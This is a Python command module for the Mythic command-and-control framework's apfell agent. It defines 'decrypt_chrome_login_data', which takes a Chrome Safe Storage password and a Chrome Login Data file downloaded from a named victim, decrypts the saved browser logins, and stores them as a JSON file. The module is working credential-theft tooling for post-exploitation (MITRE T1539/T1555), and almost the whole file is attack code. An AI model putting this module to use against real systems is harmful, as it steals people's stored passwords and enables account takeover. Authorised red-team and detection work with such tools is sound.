from mythic_container.MythicCommandBase import *
import os
from mythic_container.MythicRPC import *
from apfell.pycookiecheat.pycookiecheat import crisp
import base64


class DecryptChromeLoginDatasArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                display_name="Chrome Safe Storage Password",
                name="password",
                type=ParameterType.Credential_JSON,
                description="Chrome safe storage password from the user's keychain",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        ui_position=1
                    )
                ]
            ),
            CommandParameter(
                name="username",
                type=ParameterType.String,
                description="Victim's username from whom to steal the cookies",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        ui_position=2
                    )
                ]
            ),
            CommandParameter(
                name="file_id",
                type=ParameterType.String,
                description="File ID for the Login Data file to parse",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        ui_position=3
                    )
                ]
            ),
        ]

    async def parse_arguments(self):
        self.load_args_from_json_string(self.command_line)


class DecryptChromeLoginDataCommand(CommandBase):
    cmd = "decrypt_chrome_login_data"
    needs_admin = True
    help_cmd = "decrypt_chrome_login_data -password \"chrome safe storage password\" -username {username}"
    description = "Uses the chrome safe storage password to decrypts the login data that was downloaded for this user"
    version = 1
    supported_ui_features = [""]
    author = "@antman"
    parameters = []
    attackmapping = ["T1539", "T1555"]
    script_only = True
    argument_class = DecryptChromeLoginDatasArguments

    async def process_response(self, response: AgentResponse):
        pass

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        ## write the cookies file to a new file on disk
        task.args.add_arg("password", task.args.get_arg("password")["credential"])
        getCookiesResp = await MythicRPC().execute("get_file",
                                                   task_id=task.id,
                                                   file_id=task.args.get_arg("file_id"),
                                                   max_results=1,
                                                   get_contents=True)
        if getCookiesResp.status == MythicRPCStatus.Success and len(getCookiesResp.response) > 0:
            getCookiesResp = getCookiesResp.response[0]
        else:
            await MythicRPC().execute("create_output", task_id=task.id,
                                      output="Encountered an error attempting to get downloaded file: " + getCookiesResp.error)
            remove_temp_files()
            task.status = MythicStatus("Error: Failed to get cookies file")
            return task

        try:
            f = open("tmp_Login", "wb")
            f.write(base64.b64decode(getCookiesResp["contents"]))
            f.close()
        except Exception as e:
            await MythicRPC().execute("create_output", task_id=task.id,
                                      output="Encountered an error attempting to write the login data to a file: " + str(e))
            remove_temp_files()
            task.status = MythicStatus("Error: Failed to write file to disk")
            return task

        cookie_args = {"login_file": "/Mythic/mythic/tmp_Login",
                       "key": task.args.get_arg("password"),
                       "output": "login.json"}

        ## Decrypt Cookies file
        try:
            crisp(cookie_args)
            if os.path.isfile("login.json"):
                if os.path.getsize("login.json") != 0:

                    json_file = open("login.json", "r")
                    json_load = json.load(json_file)
                    cookie_dump = json.dumps(json_load, indent=4)
                    await MythicRPC().execute("create_output",
                                              task_id=task.id,
                                              output=f"[*] Logins Decrypted:\n{cookie_dump}")
                    json_file.close()
                    cookie_file_save_resp = await MythicRPC().execute("create_file",
                                                                      task_id=task.id,
                                                                      file=base64.b64encode(cookie_dump.encode()).decode(),
                                                                      delete_after_fetch=False,
                                                                      saved_file_name="logins.json",
                                                                      comment=f"{task.args.get_arg('username')}'s Decrypted Login Data")
                    if cookie_file_save_resp.status == MythicRPCStatus.Success:
                        await MythicRPC().execute("create_output",
                                                  task_id=task.id,
                                                  output="\nLogin Data file saved to files (uploads)")
                    else:
                        await MythicRPC().execute("create_output",
                                                  task_id=task.id,
                                                  output="Login Data file failed to save")
                else:
                    await MythicRPC().execute("create_output",
                                              task_id=task.id,
                                              output="No login data found in Login Data file")
            else:
                await MythicRPC().execute("create_output",
                                          task_id=task.id,
                                          output="login.json file failed on creation")
                remove_temp_files()
                task.status = MythicStatus("Error: Failed to decrypt login Data")
                return task

        except Exception as e:
            await MythicRPC().execute("create_output",
                                      task_id=task.id,
                                      output="PyCookieCheat script failed with error: " + str(e))
            remove_temp_files()
            task.status = MythicStatus("Error: Failed to decrypt login data")
            return task
        # Remove the Cookies file from disk
        remove_temp_files()
        task.status = MythicStatus.Completed
        return task


def remove_temp_files():
    try:
        if os.path.isfile('/Mythic/mythic/tmp_Login'):
            os.remove('/Mythic/mythic/tmp_Login')
    except Exception as e:
        raise Exception("Failed to remove apfell/mythic/tmp_Login file")
    try:
        if os.path.isfile('/Mythic/mythic/login.json'):
            os.remove('/Mythic/mythic/login.json')
    except Exception as e:
        raise Exception("Failed to remove apfell/mythic/login.json file")
    try:
        if os.path.isfile('/Mythic/mythic/tmp_login.keychain-db'):
            os.remove('/Mythic/mythic/tmp_login.keychain-db')
    except Exception as e:
        raise Exception("Failed to remove apfell/mythic/tmp_login.keychain-db")
